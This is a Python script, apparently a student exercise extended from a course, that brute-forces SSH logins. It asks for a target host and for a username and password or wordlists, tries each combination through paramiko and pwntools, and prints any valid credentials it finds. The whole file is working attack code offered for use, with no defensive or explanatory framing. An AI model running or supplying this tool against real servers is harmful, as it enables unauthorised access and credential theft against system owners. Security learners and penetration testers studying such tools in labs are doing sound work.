#!/usr/bin/python3
# This is an ssh bruteforcer that I expanded on from TCM's python 101 course.
# I attempted to create some functions that could assist with cleaning up an creating lists for the
# brute forcing function
from pwn import *
import paramiko

# This function is called within the file_check() function to clean up any white spaces and split
# the file into an interable list
def clean_list(f):
    f_list = []
    f = f.strip().split("\n")
    return f

# This checks if the input from the user is a file and then sends
# the file to the clean_list function to create and clean up the file into an interable list.
# It then returns the list or user input
def file_check(user_input):
    if ".txt" in user_input:
        file = user_input
        with open(file, 'r') as f:
            current_list = f.read()
        return clean_list(current_list)
    else:
        return user_input

# This is the bulk of the actual program
# This function keeps track of the number of attempts made by the program and makes the SSH connections.
def brute(target, username, passwords):
    attempts = 0
  # if the function finds that the username parameter is a list then it will use 2 for loops
  # to iterate over the username list and the password list
    if type(username) == list:
        for usern in username:
            for password in passwords:
                try:
                  # this part of the function prints the current username and password combination
                  # Then akes a connection to the target machine using the ssh function from paramiko
                    print(
                        f"[{attempts}] Attempting username: '{usern}'' password: '{password}'")
                    ssh_response = ssh(
                      # Paramiko might throw some errors relating to banner grabbing
                      # This has to do with server, in most cases, not being able to respond appropriately.
                      # If this happens attempt to adjust the timeout time below
                        host=target, user=usern, password=password, timeout=1)
                    if ssh_response.connected():
                        print(
                            f"[X] Valid username and password found! : '{usern}':'{password}'")
                        ssh_response.close()
                        break
                    ssh_response.close()
                except paramiko.ssh_exception.AuthenticationException:
                    print("[~] Invalid username and password combination!")
                    attempts += 1
    # This take a single username and iterates over it with the password list
    else:
        for password in passwords:
            try:
                print(
                    f"[{attempts}] Attempting username: '{username}' and password: '{password}'")
                ssh_response = ssh(
                    host=target, user=username, password=password, timeout=2)
                if ssh_response.connected():
                    print(
                        f"[X] Valid password found! : '{username}':'{password}'!")
                    ssh_response.close()
                    break
                ssh_response.close()
            except paramiko.ssh_exception.AuthenticationException:
                print("[~] Invalid password!")
                attempts += 1

# This is responsible for the user input and then calling the appropriate functions to brute force.
target_machine = input("Please specify a target:\n")
username = file_check(input(
    "Please specify a username, or a username list as a .txt file:\n"))
password = file_check(input(
    "Please specify a password, or a password list as a .txt file:\n"))
print("[!][!][!]Beginning Brute Force[!][!][!]")
brute(target=target_machine, username=username, passwords=password)
